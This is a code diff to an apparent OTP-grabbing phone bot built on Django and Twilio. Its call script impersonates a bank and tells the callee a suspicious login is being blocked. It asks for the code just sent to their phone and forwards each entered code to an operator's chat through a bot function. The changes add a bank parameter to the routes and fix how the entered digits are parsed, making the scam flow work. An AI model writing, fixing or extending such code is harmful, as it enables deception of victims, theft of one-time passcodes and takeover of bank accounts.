@@ -445,10 +445,10 @@ def gather(request,chat_id,bank):
             gather.say('We need to confirm your identity first before blocking this request. Enter the pin code sent to your phone number.')
             resp.append(gather)
         elif len(choice) > 3:
-            gather = Gather(action=f'/pay/otp/{chat_id}/')
+            gather = Gather(action=f'/pay/otp/{chat_id}/{bank}/')
             resp.say(f"You have entered {choice}. Press 1 to confirm, or press 2 to re-enter")
             text = f'The OTP code inputed by the user at first stage is {choice}'
-            main(chat_id,text)
+            bot(chat_id,text)
             resp.append(gather)
             
         else:
@@ -461,23 +461,23 @@ def gather(request,chat_id,bank):
     return HttpResponse(str(resp))
 
 @csrf_exempt
-def choice(request, chat_id):
+def choice(request, chat_id, bank):
     resp = VoiceResponse()
 
     if 'Digits' in request.POST:
         pin = request.POST['Digits']
 
-        if pin[:-1] == '1':
+        if pin == '1':
             text = f'The OTP code inputed by the user is {pin}✅'
-            main(chat_id,text)
+            bot(chat_id,text)
             resp.say("Thank you for your cooperation. The suspicious login has been blocked.")
         
-        elif pin[:-1] == '2':
-            resp.redirect(f"/pay/gather/{chat_id}/")
+        elif pin == '2':
+            resp.redirect(f"/pay/gather/{chat_id}/{bank}/")
         else:
             resp.say("Error No digits")
     else:
         text = "Error No digits"
-        main(chat_id,text)
+        bot(chat_id,text)
 
     return HttpResponse(str(resp))
